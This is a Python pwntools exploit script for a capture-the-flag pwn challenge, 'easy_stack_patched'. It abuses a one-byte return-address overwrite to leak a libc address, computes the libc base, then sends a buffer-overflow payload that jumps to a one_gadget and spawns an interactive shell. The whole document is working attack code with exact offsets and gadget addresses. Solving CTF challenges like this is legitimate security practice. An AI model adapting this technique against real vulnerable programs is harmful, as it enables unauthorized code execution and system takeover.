#!/usr/bin/env python
from pwn import *

elf = context.binary = ELF('./easy_stack_patched', checksec = False)
libc2 = ELF('./libc-2.27.so', checksec = False)
libc = ELF('./libc6-amd64_2.27-3ubuntu1.2_i386.so', checksec = False)
# context.log_level = 'debug'

host, port = 'nc.eonew.cn',10004

# io = remote(host, port)

io = elf.process()
# io = gdb.debug('./easy_stack_patched')

# this is a classic buffer overflow challenge, which it is an off by one bug with read() that we overwrite only 1 byte of the return address, which will lead us to have the ability to return to main, and get a leak. After that it is just a classic ret2libc attack

buffer = b'A' * 136 + b'\xf8'
io.sendline(buffer)
io.recvuntil(b'A' * 136)
leak = u64(io.recv(6).ljust(8, b'\x00'))
log.info("leak address: " + hex(leak))


libc_start = leak - 344
log.info("__libc_start_main address: " + hex(libc_start))

libc_base = libc_start - libc.symbols['__libc_start_main']
log.success("Libc base: " + hex(libc_base))

system = libc_base + libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00')) + libc_base
one_gadget = libc_base + 0x4244e

log.info('system address: ' + hex(system))
log.info('/bin/sh address: ' + hex(bin_sh))
log.info("one_gadget address: " + hex(one_gadget))

payload = b'A' * 136 + p64(one_gadget)
io.sendline(payload)
io.recvline(2)
io.recvline()
log.success("PWNED!")

# gdb.attach(io)

io.interactive()

